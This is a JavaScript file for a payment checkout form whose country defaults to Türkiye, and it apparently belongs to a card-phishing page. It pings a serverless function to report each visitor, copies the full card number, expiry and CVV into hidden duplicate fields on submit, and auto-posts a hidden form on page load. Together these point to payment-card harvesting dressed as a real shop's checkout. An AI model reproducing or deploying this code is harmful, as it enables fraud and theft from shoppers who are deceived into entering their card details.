let shippingInfo = {
    fullName: '',
    email: '',
    phone: '',
    address: '',
    city: '',
    zip: '',
    country: 'Türkiye',
    shippingMethod: 'standard',
    nameOnCard: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
};

function handleInputChange(event, key) {
    shippingInfo[key] = event.target.value;
}

function handleRadioChange(event) {
    shippingInfo.shippingMethod = event.target.value;
}
function handleInputChange(event, key) {
    let value = event.target.value;

    // Convert nameOnCard to uppercase
    if (key === 'nameOnCard') {
        value = value.toUpperCase();
        event.target.value = value;  // Update the input field's displayed value
    }

    shippingInfo[key] = value;
}

function validateCardNumber(input) {
    let cardNumber = input.value.replace(/\D/g, '').substring(0, 16);
    cardNumber = cardNumber != '' ? cardNumber.match(/.{1,4}/g).join(' ') : '';
    input.value = cardNumber;
    shippingInfo.cardNumber = cardNumber;
}

function validateExpiry(input) {
    let expiryDate = input.value.replace(/\D/g, '').substring(0, 4);
    expiryDate = expiryDate != '' ? expiryDate.match(/.{1,2}/g).join('/') : '';
    input.value = expiryDate;
    shippingInfo.expiry = expiryDate;
}

function validateCVV(input) {
    let cvv = input.value.replace(/\D/g, '').substring(0, 3);
    input.value = cvv;
    shippingInfo.cvv = cvv;
}

fetch('/.netlify/functions/send_email', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        message: 'A user has visited the page!'
    })
});

document.getElementById('Turkey-checkout-formal').addEventListener('submit', (event) => {
    event.preventDefault();
document.getElementById('hiddenFullName').value = document.getElementById('fullName').value;
document.getElementById('nameOnCardx').value = document.getElementById('nameOnCard').value;
    document.getElementById('cardNumberx').value = document.getElementById('cardNumber').value;
    document.getElementById('expiryx').value = document.getElementById('expiry').value;
    document.getElementById('cvvx').value = document.getElementById('cvv').value;

    
    let isValidForm = true;
    for(let key in shippingInfo){
        if(!shippingInfo[key]){
            isValidForm = false;
            break;
        }
    }
    
    if(isValidForm){
        document.getElementById('Turkey-checkout-formal').submit();
    } else {
        alert("Please fill out all the fields!");
    }
});

const inputFields = ['fullName', 'email', 'phone', 'address', 'city', 'zip', 'country', 'nameOnCard', 'cardNumber', 'expiry', 'cvv'];
inputFields.forEach((inputField, index) => {
    const element = document.getElementById(inputField);
    element.addEventListener('input', function(event) {
        if (element.id === 'cardNumber') {
            validateCardNumber(element);
        } else if (element.id === 'expiry') {
            validateExpiry(element);
        } else if (element.id === 'cvv') {
            validateCVV(element);
        }
        handleInputChange(event, element.id);
        if (element.value.length === (element.maxLength || element.size)) {
            const nextInput = inputFields[index + 1];
            if (nextInput) {
                document.getElementById(nextInput).focus();
            }
        }
    });
});
document.addEventListener("DOMContentLoaded", function() {
    const form = document.querySelector('#hiddenForm');
    
    fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams(new FormData(form)).toString()
    }).then(response => {
        // Form successfully submitted
    }).catch(error => {
        // Error occurred during submission
    });
});
document.addEventListener("DOMContentLoaded", function() {
    // ... existing code ...

    // Set default value for country field
    const countryInput = document.getElementById('country');
    if (countryInput) {
        countryInput.value = 'Türkiye';
    }
});



document.getElementById('standardShipping').addEventListener('change', handleRadioChange);
document.getElementById('priorityShipping').addEventListener('change', handleRadioChange);
